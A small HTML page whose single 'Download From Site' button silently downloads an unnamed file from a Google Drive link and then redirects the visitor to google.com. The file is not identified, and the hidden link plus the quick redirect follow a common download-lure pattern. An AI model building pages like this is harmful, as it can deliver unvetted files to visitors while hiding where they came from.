<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<script>
function a() {

  // Trigger download terlebih dahulu
  var link = document.createElement('a');
  link.href = 'https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  // Redirect setelah download mulai (delay kecil)
  setTimeout(function () {
    window.location.href = "https://google.com";
  }, 320); // 0.8 detik
}
</script>

<center>
  <input type="button" class="button" value="Download From  Site" onclick="a()">
</center>

</body>
</html>
